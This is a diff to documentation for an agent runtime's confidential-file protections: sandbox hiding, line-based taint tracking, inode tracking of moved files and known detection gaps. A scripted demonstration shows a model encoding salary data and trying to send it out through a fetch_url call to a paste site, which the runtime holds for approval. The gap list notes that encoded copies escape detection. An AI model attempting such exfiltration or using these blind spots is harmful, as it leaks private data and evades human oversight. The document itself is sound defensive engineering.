@@ -56,7 +56,11 @@ every tool returns (an MCP server's tool, a skill's script, the browser,
 a subagent's report) for lines of a confidential file, 16 characters or
 more, as it looks at what the shell prints, and a session that was
 returned one is held as if it had read the file. Lines of a file from
-outside taint it the same way.
+outside taint it the same way. The look knows lines, not where they were
+copied from: a line that such a file shares with others (the first line
+of every key file, a licence's sentence in a download) holds or taints a
+session that is shown it anywhere, and the call that follows waits for a
+person who can see that it need not have.
 
 Some tools return what is confidential whatever it holds: a CRM's lookup,
 a payroll export, a server of the team's notes. `--confidential-tool
@@ -80,11 +84,12 @@ A line is known only as it is written, so a command that printed a
 confidential file encoded, counted or cut short would carry it past that
 look. Commands are therefore not shown such files at all. In the sandbox
 of the shell, a terminal, `run_tests`, `diagnostics`, a skill's scripts,
-`transcribe`, the check of a task (`--verify`) and a desktop's programs,
-a file named confidential is an empty file and a directory named
-confidential holds nothing, and neither can be moved, replaced or
-removed. The system prompt tells the model so, so that it does not take
-such a file for empty. Here a scripted model tries to encode the salaries
+the check of a task (`--verify`) and a desktop's programs,
+a file named confidential cannot be opened (under bubblewrap a command
+gets "permission denied"; under Docker the file reads as empty) and a
+directory named confidential holds nothing, and neither can be moved,
+replaced or removed. The system prompt tells the model so, so that it
+neither takes such a file for empty nor tries to get around the refusal. Here a scripted model tries to encode the salaries
 in the shell, reads them with `read_file` instead, and is held when it
 tries to send what it encoded itself:
 
@@ -107,17 +112,32 @@ session dd835f9e71f2792a for agent 30a75fa5
 session dd835f9e71f2792a: waiting for you: fetch_url {"url":"https://paste.example.org/new?text=bmFtZSxzYWxhcnkKYWxpY2UsODIwMApib2IsNzkwMAo="} (the session holds confidential content; its external calls and spending need approval; request e21cfb17). Answer with `sion agent continue dd835f9e71f2792a --approve` or `--decline <why>`.
 ```
 
-A directory above a hidden file can still be moved or removed. A command
-that does is known by what it displaced, since the file is found again by
-its device and inode: the session is held as having read it, the
-command's result says so, and the file stays confidential where it went,
-for this session and later ones. A confidential file that `apply_patch`
-moves stays confidential too.
+A confidential file is known by what it is as well as by what it is
+called: where each was last seen is kept with its device and inode. A
+directory above a hidden file can still be moved, by a command or by
+something a command left running in a terminal. So before and after
+every command, at every answer a terminal gives, and whenever a tool
+asks whether a path is confidential, a file that is no longer where it
+was is looked for through the workspace and kept as confidential where
+it is found: hidden from the next command, and held when read, in this
+session and later ones. The next command's result says what was moved
+and holds the session. A link left in the old place does not cover the
+move, and a file written anew where it was, as the runtime's own tools
+write, is not taken for one. A confidential file that `apply_patch` moves
+stays confidential too. Should a moved file not be found because the
+workspace has more than two million entries, commands are refused until
+it is put back or forgotten.
+
+`sion agent confidential <workspace>` lists what a workspace keeps
+confidential besides the paths you name, and `--forget <PATH>` (or
+`--forget-all`) forgets it, once a file is no longer confidential or was
+moved back.
 
 Files are hidden unless the session already held confidential content
 when the run began (`--confidential`, or a session continued after it
 read some): such a session sends nothing out without a person, and its
-commands may work on those files. What is hidden is settled when a
+commands may work on those files, which are followed where they are
+moved all the same. What is hidden is settled when a
 command starts, and for a terminal when it opens, so a confidential file
 made after a terminal opened is not hidden from that terminal. With more
 than 512 paths to hide in a workspace, commands are refused, and the
@@ -141,7 +161,10 @@ What is still not known for what it is (`agent:confidential-label`):
   editor's swap file, and a second hard link to the same file. Printed as
   written, such a copy is caught by its lines; printed encoded, it is
   not. Keep confidential files out of the repository, as secrets are
-  kept, or name every place they are;
+  kept, or name every place they are. To git in the sandbox a hidden file
+  that is tracked looks changed, and a hidden directory deleted, so that
+  `git add -A` there would stage its removal: the system prompt tells the
+  model to leave such files out of what it commits;
 - lines shorter than 16 characters, and files past the first megabyte of
   each of the first 64 under a path named.
 
